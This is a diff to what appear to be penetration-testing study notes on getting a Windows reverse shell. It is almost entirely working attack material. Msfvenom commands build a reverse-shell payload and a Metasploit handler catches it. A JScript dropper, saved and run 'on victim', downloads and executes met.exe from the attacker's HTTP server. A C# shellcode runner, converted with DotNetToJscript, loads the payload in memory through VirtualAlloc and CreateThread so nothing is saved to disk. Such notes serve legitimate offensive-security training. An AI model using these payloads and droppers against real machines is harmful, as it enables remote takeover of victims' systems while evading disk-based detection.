@@ -184,7 +184,7 @@ End Sub
 1. `msfvenom -p windows/x64/shell/reverse_tcp LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f exe -o met.exe`
 2. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
 3. `python3 -m http.server <port of your choice>`
-4. On victim:
+4. On victim, save this as <filename>.js and run it:
 ```
 var url = "http://<kali ip>:<http port>/met.exe"
 var Object = WScript.CreateObject('MSXML2.XMLHTTP');
@@ -208,6 +208,44 @@ if (Object.Status == 200)
 var r = new ActiveXObject("WScript.Shell").Run("met.exe");
 ```
 </details>
+
+### Does not save to disk
+1. `msfvenom -p windows/x64/shell/reverse_tcp LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f csharp`
+2. I saved DotNetToJscript-master on the kali, copy it over, then run the .sln file. 
+3. Navigate to TestClass.cs (on the right), then use this to replace the `public class TestClass` part:
+```
+public class TestClass
+{
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+      uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
+      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll")]
+    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+    public TestClass()
+    {
+        <paste the output from 1>
+
+        int size = buf.Length;
+
+        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+
+        Marshal.Copy(buf, 0, addr, size);
+
+        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+
+        WaitForSingleObject(hThread, 0xFFFFFFFF);
+    }
+
+    public void RunProcess(string path)
+    {
+        Process.Start(path);
+    }
+}
 
 
 
